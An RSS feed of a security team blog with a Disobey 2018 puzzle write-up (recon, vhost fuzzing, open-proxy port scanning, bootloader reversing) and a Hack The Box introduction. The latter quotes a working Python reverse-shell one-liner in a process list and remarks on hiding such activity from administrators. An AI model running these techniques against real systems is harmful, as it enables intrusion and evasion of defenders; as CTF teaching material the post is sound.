@@ -1,0 +1,275 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>lokori &#8211; Team ROT Information Security</title>
+	<atom:link href="/author/lokori/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Team ROT Information Security</description>
+	<lastBuildDate>Sat, 29 Aug 2020 10:50:01 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png</url>
+	<title>lokori &#8211; Team ROT Information Security</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Solving the Disobey 2018 puzzle</title>
+		<link>/solving-the-disobey-2018-puzzle/</link>
+		
+		<dc:creator><![CDATA[lokori]]></dc:creator>
+		<pubDate>Mon, 17 Sep 2018 07:42:57 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://rot.fi/?p=1414</guid>
+
+					<description><![CDATA[This is a writeup for the Disobey 2018 hacker ticket puzzle. There were 50 "hacker" tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.]]></description>
+										<content:encoded><![CDATA[<p>This is a writeup for the <a href="https://disobey.fi/">Disobey 2018 </a>hacker ticket puzzle. There were 50 &#8220;hacker&#8221; tickets available and the puzzle was open for about a month. It was a bit tougher this time than it was in previous years.</p>
+<h2>Spoiler alert</h2>
+<p><strong><span style="color: #ff0000;">WARNING: This obviously CONTAINS SPOILERS.</span> </strong>Do not read further if you want to solve it yourself! And you should try (harder)!</p>
+<hr>
+<p>It began with the URL&nbsp;<a href="http://puzzle.disobey.fi/">http://puzzle.disobey.fi/</a>.</p>
+<h2>Quick recon</h2>
+<p>First thing I&#8217;m used to doing is recon with <strong><em>nmap</em></strong></p>
+<blockquote><p>nmap -v -sC -sV -oA initial_nmap puzzle.disobey.fi</p></blockquote>
+<p>This quickly revealed two webservers. The other one only replied &#8220;Try harder&#8221;, a good tip indeed.<br />
+The other one had a standard nginx web page.<br />
+<img decoding="async" class="alignnone size-full wp-image-1417" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png" alt="Screen Shot 2018-09-17 at 10.47.09" width="2492" height="736" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09.png 2492w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-300x89.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1030x304.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-768x227.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1536x454.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-2048x605.png 2048w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-1500x443.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-10.47.09-705x208.png 705w" sizes="(max-width: 2492px) 100vw, 2492px" /><br />
+HTML source for the test page reveals there&#8217;s a resource <strong><em>lorem.html</em></strong>&nbsp;. So I downloaded that, but what to do with the seemingly standard &#8220;lorem ipsum&#8221; stuff?<br />
+At the same time, my standard approach to <a href="https://www.hackthebox.eu/">HackTheBox</a> is to crawl for additional hidden resources left &#8220;accidentally&#8221; in the web server. So <em><strong>nikto</strong></em> + <em><strong>dirb</strong></em> + <em><strong>gobuster</strong></em> it is.<br />
+My normal HTB enumerator uses Kali linux standard lists and some additional ones from the <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.<br />
+https://gist.github.com/lokori/3ba0a98ab9cf9f1b17f83151295c666a<br />
+This crawling revealed <em><strong>.bash_history</strong></em> which lead to an SQL file, but that didn&#8217;t lead to&nbsp; anything interesting.<br />
+So, back to lorem.html. With this kind of puzzle it&#8217;s important to remember that everything is not relevant to the solution, but the relevant hints and resources are provided in the puzzle. I need to remind myself of that when I get stuck.</p>
+<h2>lorem lorem lorem</h2>
+<p>Cut it into separate words.</p>
+<blockquote><p>cat pier.sh<br />
+#!/bin/bash<br />
+for word in $(&lt;lorem.html)<br />
+do<br />
+echo &#8220;$word&#8221;<br />
+done<br />
+./pier.sh &lt; lorem.html | sed s/[\.,]//g|sort|uniq &gt; lorems.txt</p></blockquote>
+<p>and then</p>
+<blockquote><p>cat lorems.txt |xargs -I {} curl -O &#8216;http://puzzle.disobey.fi/{}&#8217;</p></blockquote>
+<p>Now we get</p>
+<blockquote><p>ls -laS<br />
+-rw-r&#8211;r&#8211; 1 root root 3650 Aug 2 09:08 vulputate<br />
+-rw-r&#8211;r&#8211; 1 root root 1421 Aug 2 09:07 lorems.txt<br />
+-rw-r&#8211;r&#8211; 1 root root 11 Aug 2 09:08 Interdum</p></blockquote>
+<p>Okay.. clearly one reply is very different!<br />
+It says: <em><strong>&#8220;Wrong vhost&#8221;</strong></em><br />
+ok, so let&#8217;s <em><strong>curl</strong></em> again with another vhost?</p>
+<blockquote><p>curl &#8211;header &#8216;Host: julli.disobey.fi&#8217; http://puzzle.disobey.fi/Interdum<br />
+Try harder &#8211; admin</p></blockquote>
+<p>So this seems kind of promising, but what is the proper virtual host?<br />
+Not one of these.</p>
+<blockquote><p>cat lorems.txt |xargs -I {} curl -o {} &#8211;header &#8216;Host: {}.disobey.fi&#8217; &#8216;http://puzzle.disobey.fi/Interdum&#8217;</p></blockquote>
+<p>It took a while, but the answer was not very complicated after all.</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum<br />
+Greetings! Love you &lt;3 &#8211; I need -love also</p></blockquote>
+<p>Okay, let&#8217;s make some &#8220;-love&#8221; then..</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; http://puzzle.disobey.fi/Interdum-love</p></blockquote>
+<h2>Secrets</h2>
+<p>Now we find a nice text file.</p>
+<blockquote><p>cat secret.txt<br />
+Hi John!<br />
+Here is that secret email &#8211; encrypted with your favorite PIN-code!<br />
+SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu</p></blockquote>
+<p>Base64 decode says <em><strong>&#8220;Just kidding &#8211; base64 is awesome.&#8221;</strong></em><br />
+Heh. Hah. Hoh. We still have test.php there. It is a small file so it can&#8217;t be very complicated to exploit it and it&#8217;s the only lead we have now.<br />
+Perhaps there is a parameter that is exploitable, but what is the parameter name?&nbsp; There is <a href="https://github.com/xmendez/wfuzz"><em><strong>wfuzz</strong></em></a>, but let&#8217;s be old school.</p>
+<blockquote><p>cat /root/tools/SecLists/Discovery/DNS/namelist.txt |xargs -I {} curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?{}=123&#8217;</p></blockquote>
+<p>Still no luck. At this point I was very frustrated and angry at myself.</p>
+<h2>Black hat Python</h2>
+<p>When I get frustrated in this way I usually write some Python to take full control of the issue. So, I wrote this one-time piece.<br />
+<img decoding="async" class="alignnone size-full wp-image-1426" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png" alt="Screen Shot 2018-09-20 at 9.23.50.png" width="1290" height="1312" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50.png 1290w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-295x300.png 295w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-1013x1030.png 1013w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-80x80.png 80w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-768x781.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-36x36.png 36w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.23.50-693x705.png 693w" sizes="(max-width: 1290px) 100vw, 1290px" /><br />
+<span style="background-color: #ffffff; color: #3d596d;">This tries sufficiently different values for each parameter name candidate. Given the proper word lists this finally found the parameter name, which was simply &#8220;url&#8221;.</span><br />
+How to exploit that?<br />
+Randomly trying some numbers.</p>
+<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=1234561251&#8217;* Trying 185.86.149.26&#8230;</p></blockquote>
+<p>Resulted in &#8220;504 Gateway Time-out&#8221;. Hmm.</p>
+<blockquote><p>curl -v &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=213070643/index.html&#8217;</p></blockquote>
+<p>Gave out &#8221;&nbsp;HTTP/1.1 403 WAF&#8221;.<br />
+It&#8217;s a HTTP proxy! The numbers in the URL can be translated into IP addresses which enables us proxy GET requests. Let&#8217;s try the other web server in the puzzle machine through this (as the call comes from the localhost, it might behave differently):</p>
+<blockquote><p>curl &#8211;header &#8216;Host: admin&#8217; &#8216;http://puzzle.disobey.fi/Interdum-love/test.php?url=0:8021%2f2&#8217;</p></blockquote>
+<p>And in fact, it does! There is a one character different in the reply &#8220;Try harder!1&#8221; vs. &#8220;Try harder!&#8221; but this doesn&#8217;t lead to anything interesting.</p>
+<h2>Proxy as a port scanner</h2>
+<p>This is one of the standard tricks &#8211; if there is an open proxy, it can be used to scan the internal network for ports and services not directly accessible from the outside. Let&#8217;s go!<br />
+Very crude scanner in Python.<br />
+<img decoding="async" class="alignnone size-full wp-image-1427" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png" alt="Screen Shot 2018-09-20 at 9.28.35.png" width="1164" height="662" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35.png 1164w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-300x171.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-1030x586.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-768x437.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.28.35-705x401.png 705w" sizes="(max-width: 1164px) 100vw, 1164px" /><br />
+We find SSH server and.. finally, something very interesting came up!</p>
+<blockquote><p>FOUND !! 0:40053 // 51<br />
+H4sIAI5uYVsAA+3STUgUURwA8Oe2OyyGHyF4qMtb6KAXm+eubq7rmq5bFuWaHxGWyrrO5ObuzjI7Yx+o+47mQTp16rRHE9HwEBjjhjVUsBHdqktQxtQgSpgHE+utRkGEdBEJ/j8Y3vzn//HewOuTJCUqhfoFGe0ZnuerXS6cW93VVdsrX7kTM4QnboKJ0+nkK6vdlTzBPHHyLjfC/N4d6Tc1qYRkdpRBV4zsVsfKRHGX/M7P4F/rf+KzbRihzY2x0vYUyZC35Bl5RdbJd7L8EA1PvJzITLybML7No9FxVsAv8+uzlgUbmrPMHMiWyHalZDZv64m5zH/IlgTVj9rVlPHe8ule3n7/FPhHnZMiyYi1HJJN28pGVHeszmDroXQN9XAeqqDoVibtoSZq17la6tQ5L60wLV36NJ+xYmtxuo6lVnXORyvS9VTnTuSy01svrLZ0AwsbqUfn/PS4zjVRXucCtFLnTlKyUEONFqT1poznSBtNGY/RwlFq3ETU56IN6jHqq6J+tYz6qmmj6qA+N21SD2v3U8ZdpLG6O0hzUOM20t6kjHG0saYtpYwEoiMWp+rUAxY3HbETpVwP2IkeKKzXA0V1P2/1umaj80XIP+VFir3s6dajsTzzy+KDFW1jbQ5lS7125aC3QDkyV5gtnjSXgzq75IUz9mzxDGYPW83XLC5g7/nZ4sXOW0sXtI6UYUc9hpWdwtycsmcULtdsfl1ElxzduLWh5bQfozZJVQQcbM8vQE2R5CCWhVA/FkORqNDvYN9aZen6DZwU5CFBxoqE1aSARUnGoqCEByLxK1hklUlcJiWUiBQPRcs9GPmleFwI5+JcRywiy7mG7ZF4KBLCidxMVtcciipsRAXbJsjGi1HpGi7zDwjhwaQaY33JWIhtUo5Z/tSZi83hs8HucwPnO/raYpc7E73RZKS3K9wTRyz9pwZ/Y9M+XFYAAAAAAAAAAAAAAAAAAAAAAAAAAPAXPwDTbo0GACgAAA==1</p></blockquote>
+<p>So what is this?</p>
+<blockquote><p>cat pokale.txt | base64 -d &gt; pokale.bin<br />
+file pokale.bin<br />
+pokale.bin: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix</p></blockquote>
+<p>Ok, so a zip file. Our next step obviously.</p>
+<h2>Mystery binary</h2>
+<p>First standard thing is to run <em><strong>strings.</strong></em></p>
+<blockquote><p>bootloader<br />
+000644<br />
+000765<br />
+000024<br />
+00000010171 13330267201 013047<br />
+ustar<br />
+00k4m1<br />
+staff<br />
+000000<br />
+000000<br />
+[!] PANIC<br />
+Route OS<br />
+Disk read failed!<br />
+Proxy server to use for fetching files (optional):<br />
+Connection to mirror failed via proxy:<br />
+Halting.<br />
+Overflow (Checksum mismatch)<br />
+GJXHcLO]MhQTbRm\Up_lsi_Zc^n<br />
+ACBD</p></blockquote>
+<p>So a bootloader, but two strings are interesting. <em><strong>&#8220;00k4m1&#8221;</strong></em>&nbsp;means the <a href="https://twitter.com/_k4m1_">great k4m1</a> has signed this binary! In the end,&nbsp;<em><strong>&#8220;GJXHcLO]MhQTbRm\Up_lsi_Zc^n&#8221;</strong></em>&nbsp;is very likely a decryption key or some secret we have to dissect.<br />
+Let&#8217;s try a shortcut.<br />
+<img decoding="async" class="alignnone size-full wp-image-1428" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png" alt="Screen Shot 2018-09-20 at 9.30.37.png" width="1014" height="618" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37.png 1014w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-300x183.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-768x468.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.30.37-705x430.png 705w" sizes="(max-width: 1014px) 100vw, 1014px" /><br />
+Sometimes we could be lucky, but not today. So let&#8217;s look at the binary, properly.<br />
+There is nothing wrong with <a href="https://rada.re/r/">radare2</a> but I used <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA free</a> in the end. I didn&#8217;t actually run the bootloader code at all. I just analyzed it and figured out what it does without stepping and debugging. The initial guess was correct &#8211; we need to decrypt the weird string, but it just wasn&#8217;t simple XOR.<br />
+<img decoding="async" class="alignnone size-full wp-image-1419" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png" alt="Screen Shot 2018-08-06 at 16.40.25.png" width="680" height="612" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25.png 680w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.40.25-300x270.png 300w" sizes="(max-width: 680px) 100vw, 680px" /><br />
+Replicating the &#8220;decryption&#8221; algorithm in Python we get something sensible out of it:<br />
+<img decoding="async" class="alignnone size-full wp-image-1420" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png" alt="Screen Shot 2018-09-17 at 11.28.07.png" width="828" height="534" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07.png 828w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-300x193.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-768x495.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-17-at-11.28.07-705x455.png 705w" sizes="(max-width: 828px) 100vw, 828px" /><br />
+The binary also points towards the other web server we found with the nmap so clearly we need to do something there, but there is no clear URL that gives us the ticket.</p>
+<h2>Alternate solution to binary</h2>
+<p>This is from another ROT member, Jarkko Vesiluoma:</p>
+<blockquote><p>cat something.base64 |base64 -d &gt; bootloader.gz<br />
+$ file ../bootloader2<br />
+../bootloader2: gzip compressed data, last modified: Wed Aug 1 08:25:50 2018, from Unix<br />
+$ file bootloader.raw<br />
+bootloader.raw: DOS/MBR boot sector<br />
+qemu-system-x86_64 -k fi -drive format=raw,file=bootloader.raw -s<br />
+other terminal: r2 -D gdb gdb://localhost:1234<br />
+In r2: vvv and then qq</p></blockquote>
+<p>Basically the memory of the running bootloader is accessed to get the decrypted value. It&#8217;s running inside a virtual machine so this is easy. In a way this is &#8220;cheating&#8221;, but this is a nice way to analyze an unknown binary, as long as potentially harmful actions are contained inside the virtual machine.</p>
+<h2>The final insult</h2>
+<p>Manual guessing is frustrating..</p>
+<blockquote><p>Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?ACBD=GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/?GIVE_GIVE_GIVE_ME_MY_TICKET=ACBD&#8221;<br />
+Try harder!root@kali:~/disobey/test# curl &#8211;header &#8216;Host: 123.0.0.5&#8217; &#8220;http://puzzle.disobey.fi:8021/GIVE_GIVE_GIVE_ME_MY_TICKET&#8221;</p></blockquote>
+<p>So Python it is again! I was getting really worked up at this point after all this effort. How many times do I need to &#8220;try harder&#8221; to get the ticket?<br />
+<img decoding="async" class="alignnone size-full wp-image-1429" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png" alt="Screen Shot 2018-09-20 at 9.31.50.png" width="1616" height="1058" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50.png 1616w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-300x196.png 300w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1030x674.png 1030w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-768x503.png 768w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1536x1006.png 1536w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-1500x982.png 1500w, /wp-content/uploads/2018/09/Screen-Shot-2018-09-20-at-9.31.50-705x462.png 705w" sizes="(max-width: 1616px) 100vw, 1616px" /></p>
+<p>We still need to find the right parameter list, but there is a reasonable one from the SecLists at our disposal.</p>
+<blockquote><p>python final_insult.py /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
+using word list /root/tools/SecLists/Discovery/Web_Content/burp-parameter-names.txt<br />
+FOUND !!data<br />
+HACKER! https://holvi.com/shop/Disobey/product/c995bdab7374d27f1250f1071c4a9b07/</p></blockquote>
+<p>So finally! There is a ticket.<br />
+<img decoding="async" class="alignnone size-full wp-image-1422" src="http://165.232.69.132/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png" alt="Screen Shot 2018-08-06 at 16.24.18.png" width="483" height="146" srcset="/wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18.png 483w, /wp-content/uploads/2018/09/Screen-Shot-2018-08-06-at-16.24.18-300x91.png 300w" sizes="(max-width: 483px) 100vw, 483px" /><br />
+You could have also done it with something like this using <em><strong>wfuzz</strong></em>:</p>
+<blockquote><p>wfuzz -c -z file,Web-Content/raft-large-words.txt &#8211;filter &#8220;c=200 and h&gt;11&#8221; -f disobey.1 -Z -H &#8216;Host: admin&#8217; http://puzzle.disobey.fi:8021/?FUZZ=GIVE_GIVE_GIVE_ME_MY_TICKET</p></blockquote>
+<h2>Closing words</h2>
+<p>I got really frustrated at some points during this process, but luckily I got some motivational push from other team ROT members (thank you Jarkko and Putsi). We solved this on our own, without really co-operating together, but it still helped to me to know that I&#8217;m wandering roughly to the right direction. Our solutions were different in the end as I like writing Python scripts when things get difficult. The other ROT guys are perhaps slightly more tool oriented.<br />
+I really liked the binary challenge part and overall I think the difficulty level was correct.&nbsp; It wasn&#8217;t too easy to get the hacker ticket, but perfectly doable for a motivated hacker.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Hack The Box for fun!</title>
+		<link>/1274/</link>
+		
+		<dc:creator><![CDATA[lokori]]></dc:creator>
+		<pubDate>Thu, 08 Mar 2018 12:17:07 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">https://rot.fi/?p=1274</guid>
+
+					<description><![CDATA[Fun experiences with Hack The Box and some advice for aspiring  hackers to get things going.]]></description>
+										<content:encoded><![CDATA[<h1>What is Hack The Box ?</h1>
+<p>A week ago I started hacking virtual machines and challenges at&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;and it has been a lot of fun. <strong>Hack The Box</strong>&nbsp;provides it&#8217;s users with a virtual environment with dedicated vulnerable machines and some CTF-style challenges. This post contains some pointers and introductory tips for aspiring would-be hackers, but no spoilers and you still need to solve the invitation code.<br />
+At my day job I try to ensure that the software we produce is secure. Sometimes it involves doing penetration testing, but I&#8217;m not doing the fancy Red Teaming stuff at all. If I find technical security flaws or process issues, they are fixed and there&#8217;s rarely any public disclosure.&nbsp; There might be a review and retrospective, but no one pays me to chain cool ROP gadgets to&nbsp;prove that a buffer overflow can be very dangerous. Now&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;has provided me with an excuse to do that other kind of hacking too.</p>
+<h1>How to get started?</h1>
+<p>You&#8217;ll need some basic tools. <a href="https://www.kali.org/">Kali Linux</a> in a virtual machine and some HTTP proxy (<a href="https://portswigger.net/burp">Burp</a> or <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">ZAP</a>) are sufficient for most of the things. Inside Kali, <strong><em>nmap</em></strong>, <em><strong>dirb</strong></em>, <em><strong>nikto</strong></em> and <a href="https://www.metasploit.com/">Metasploit</a> have been my most useful tools so far.<br />
+To get an idea about the hacking (as well as some tips), watch <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec&#8217;s great videos</a> about pwning the retired machines. For example, watch the&nbsp;&nbsp;<a href="https://www.youtube.com/watch?v=NMGsnPSm8iw">video about pwning Popcorn</a>.</p>
+<h1>Pwning machines</h1>
+<p>It appears that first you need to recon the machine by running <em><strong>nmap</strong></em> and <strong><em>dirb</em></strong> and other scanners to find something exploitable. Often it&#8217;s a web application, but it can be something else too. When you find &#8220;something&#8221;, try to exploit it somehow. Get some ideas about how to find &amp; exploit that &#8220;something&#8221; from <em>High on Coffee</em>:&nbsp;<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">penetration testing cheat sheet.</a><br />
+I&#8217;m not a huge fan of having to guess something artificial, but that&#8217;s not totally unrealistic. I&#8217;m not very good at that it seems, but hopefully I&#8217;ll get better. Just keep in mind, there are steps where you may need to simply guess something.</p>
+<h2>Getting from user to root</h2>
+<p>I suck at pwning Windows machines, which is something I intend to practice next, but<br />
+these links offer some ideas for the Linux/Unix systems:<br />
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ </a><a href="https://www.rebootuser.com/?p=1758">https://www.rebootuser.com/?p=1758</a><br />
+<a href="https://www.rebootuser.com/?p=1623">https://www.rebootuser.com/?p=1623</a><br />
+Of course you need to understand how Linux systems work in the first place. Crontab, file system permissions, sudo and all that other basic admin stuff.</p>
+<h1>Binary reverse engineering challenges</h1>
+<p>In order to reverse binaries in the challenges, you need some knowledge of x86 assembly. The easier ones are not really difficult, but if you can&#8217;t read assembler code, it will be quite hard.<br />
+I have tried&nbsp;<a href="https://x64dbg.com/">x64dbg</a>,&nbsp;<a href="https://www.hopperapp.com/">Hopper</a>, <a href="https://rada.re/r/">radare2</a>, <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA (free version)</a> and the good old <a href="http://www.ollydbg.de/version2.html">OllyDbg</a> so far. I also downloaded <a href="https://binary.ninja/">Binary Ninja</a>, but haven&#8217;t really tried it yet. While I don&#8217;t want to debate the merits these tools, I have found x64dbg most to my liking so far. Gives me the same vibes I felt with the ancient Turbo Debugger about 25 years ago.<br />
+My strategy so far has been straightforward:<br />
+1. Analyze what the program actually does.<br />
+2. See if there are interesting strings inside and how they are used.<br />
+3. Try to get rid of obfuscation and anti-debugging stuff by rewriting the code.<br />
+4. Try to make sense of the remaining final checking code. (single step, breakpoints etc.)<br />
+5. Perhaps write a small Python script to reveal the flag.<br />
+Some links which might be useful:<br />
+<a href="https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2">https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2 </a><a href="https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/">https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/</a><br />
+Simply replacing the annoying stuff with NOP instructions is a good starting strategy. If the state of the system (registers and flags) are not affected, this works pretty well.<br />
+<img decoding="async" class="alignnone size-full wp-image-1280" src="http://165.232.69.132/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png" alt="radare2" width="1854" height="1002" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png 1854w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-300x162.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1030x557.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-768x415.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1536x830.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1500x811.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-705x381.png 705w" sizes="(max-width: 1854px) 100vw, 1854px" />Get rid of the pesky antidebugging code!</p>
+<h1>It&#8217;s not real life</h1>
+<p>I have had fun with <strong>Hack the box</strong> (as well as some frustration also), but it has been extremely interesting to peek at what other people are doing on the machines. Here are some of my findings.</p>
+<h2>Scripters are running wild</h2>
+<p>Here&#8217;s a sample of process list from one of the machines:</p>
+<blockquote><p>www-data 2555 0.0 0.3 18904 3604 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
+www-data 2556 0.0 0.3 19004 3464 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
+www-data 1428 0.0 0.0 4508 704 ? S 10:15 0:00 sh -c cd /tmp; python -c &#8216;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket<br />
+.SOCK_STREAM);s.connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);&#8217; 2&gt;&amp;1<br />
+www-data 1429 0.0 0.9 39980 9668 ? S 10:15 0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.<br />
+connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);<br />
+www-data 1430 0.0 0.0 4508 784 ? S 10:15 0:00 /bin/sh -i<br />
+www-data 1443 0.0 1.2 256212 12588 ? S 10:15 0:00 /usr/sbin/apache2 -k start<br />
+www-data 1493 0.0 0.6 32168 6680 ? S 10:16 0:00 python -c import pty;pty.spawn(&#8220;/bin/bash&#8221;)<br />
+www-data 1494 0.0 0.3 18216 3064 pts/3 Ss 10:16 0:00 /bin/bash<br />
+www-data 1501 0.0 0.0 4508 752 ? S 10:16 0:00 sh -c cd /tmp; python -c &#8220;import pty; pty.spawn(&#8216;/bin/bash&#8217;)&#8221; 2&gt;&amp;1<br />
+www-data 1502 0.0 0.6 32168 6780 ? S 10:16 0:00 python -c import pty; pty.spawn(&#8216;/bin/bash&#8217;)</p></blockquote>
+<p>In a real system, this should light up the IDS/SIEM like a christmas tree. Even a cursory look by the administrator with<strong><em> ps -Af</em></strong> would immediately reveal that something bad is happening.<br />
+Therefore, in a real pentest (of course neither of us would do any illegal hacking), the tester would run something innocent, like <em>testrunner.sh</em>, which would hide the nefarious activities from immediate discovery. It would be in some obscure innocent folder or completely reside in memory. Most certainly, a professional wouldn&#8217;t upload anything named &#8220;<em>reverse-shell.php</em>&#8221; to the server.<br />
+Reverse shells still would show up in network connections unless masquaraded with some network magic, but that process list is just plain funny <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
